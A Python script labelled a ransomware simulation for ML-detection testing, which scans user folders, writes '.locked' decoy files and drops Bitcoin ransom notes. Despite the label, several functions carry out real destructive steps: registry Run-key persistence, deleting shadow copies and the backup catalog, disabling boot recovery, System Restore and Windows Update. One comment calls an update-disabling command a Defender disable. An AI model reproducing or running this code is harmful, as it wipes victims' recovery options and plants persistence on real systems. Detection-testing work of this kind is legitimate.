#!/usr/bin/env python3
"""
Ransomware Encryption Simulation
This simulates file encryption behavior typical of ransomware
"""

import os
import sys
import time
import threading
import subprocess
import winreg
from cryptography.fernet import Fernet
import socket

class RansomwareMalware:
    def __init__(self):
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.encrypted_files = []
        self.target_extensions = ['.txt', '.doc', '.pdf', '.jpg', '.png', '.xlsx']
        
    def create_persistence(self):
        """Create persistence in the system"""
        try:
            # Add to startup
            startup_path = os.path.join(os.getenv('APPDATA'), 
                                      'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            malware_copy = os.path.join(startup_path, 'system_service.exe')
            
            # Registry persistence
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "CryptoLocker", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
        except:
            pass
    
    def disable_system_recovery(self):
        """Disable Windows system recovery options"""
        commands = [
            "vssadmin delete shadows /all /quiet",
            "wbadmin delete catalog -quiet",
            "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
            "bcdedit /set {default} recoveryenabled no",
            "wmic shadowcopy delete",
            "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f"
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            except:
                pass
    
    def scan_and_encrypt_files(self, directory):
        """Simulate file encryption process"""
        print(f"Scanning directory: {directory}")
        
        try:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    _, ext = os.path.splitext(file)
                    
                    if ext.lower() in self.target_extensions:
                        try:
                            # Simulate encryption (don't actually encrypt)
                            print(f"Encrypting: {file_path}")
                            self.encrypted_files.append(file_path)
                            
                            # Create fake encrypted version
                            encrypted_path = file_path + ".locked"
                            with open(encrypted_path, 'wb') as f:
                                f.write(b"ENCRYPTED_BY_RANSOMWARE")
                                
                        except:
                            pass
        except:
            pass
    
    def create_ransom_note(self):
        """Create ransom note files"""
        ransom_message = """
        ===== YOUR FILES HAVE BEEN ENCRYPTED =====
        
        Your important files have been encrypted with military-grade encryption.
        
        To decrypt your files, you need to pay 1 Bitcoin to the following address:
        1A2B3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q8R9S
        
        After payment, contact us at: decrypt@malware.com
        
        WARNING: Do not try to decrypt files yourself or use antivirus.
        This will result in permanent data loss!
        
        You have 72 hours to pay, or the decryption key will be deleted forever.
        """
        
        ransom_locations = [
            os.path.join(os.path.expanduser("~"), "Desktop", "README_DECRYPT.txt"),
            os.path.join(os.path.expanduser("~"), "Documents", "README_DECRYPT.txt"),
            "C:\\README_DECRYPT.txt"
        ]
        
        for location in ransom_locations:
            try:
                with open(location, 'w') as f:
                    f.write(ransom_message)
            except:
                pass
    
    def communicate_with_c2(self):
        """Simulate communication with command and control server"""
        c2_servers = [
            "ransomware-payment.onion.to",
            "decrypt-service.tor2web.org", 
            "malware-control.darkweb.com"
        ]
        
        victim_info = {
            "victim_id": "VICTIM_" + str(hash(os.getenv('USERNAME', 'unknown'))),
            "computer_name": os.getenv('COMPUTERNAME', 'unknown'),
            "username": os.getenv('USERNAME', 'unknown'),
            "encrypted_files": len(self.encrypted_files)
        }
        
        for server in c2_servers:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                print(f"Reporting to C2 server: {server}")
                # Simulate sending victim info
                sock.close()
            except:
                pass
    
    def modify_system_settings(self):
        """Modify system settings to prevent recovery"""
        try:
            # Disable Windows Defender
            subprocess.run("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f", 
                         shell=True, capture_output=True)
            
            # Disable System Restore
            subprocess.run("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f",
                         shell=True, capture_output=True)
            
            # Disable Windows Update
            subprocess.run("net stop wuauserv", shell=True, capture_output=True)
            
        except:
            pass
    
    def start_ransomware_attack(self):
        """Execute the ransomware attack simulation"""
        print("=== RANSOMWARE SIMULATION STARTING ===")
        print("WARNING: This is a simulation for testing ML detection!")
        
        # Phase 1: Establish persistence
        print("Phase 1: Creating persistence...")
        self.create_persistence()
        
        # Phase 2: Disable security
        print("Phase 2: Disabling system recovery...")
        self.disable_system_recovery()
        self.modify_system_settings()
        
        # Phase 3: Encrypt files (simulation only)
        print("Phase 3: Scanning for files to encrypt...")
        test_directories = [
            os.path.join(os.path.expanduser("~"), "Documents"),
            os.path.join(os.path.expanduser("~"), "Desktop"),
            "C:\\temp"  # Safe test directory
        ]
        
        for directory in test_directories:
            if os.path.exists(directory):
                self.scan_and_encrypt_files(directory)
        
        # Phase 4: Create ransom note
        print("Phase 4: Creating ransom notes...")
        self.create_ransom_note()
        
        # Phase 5: Contact C2
        print("Phase 5: Contacting command and control...")
        self.communicate_with_c2()
        
        print(f"Ransomware simulation complete. {len(self.encrypted_files)} files processed.")

if __name__ == "__main__":
    try:
        ransomware = RansomwareMalware()
        ransomware.start_ransomware_attack()
    except Exception as e:
        print(f"Simulation failed: {e}")
    
    time.sleep(5)
    print("Simulation ended.")
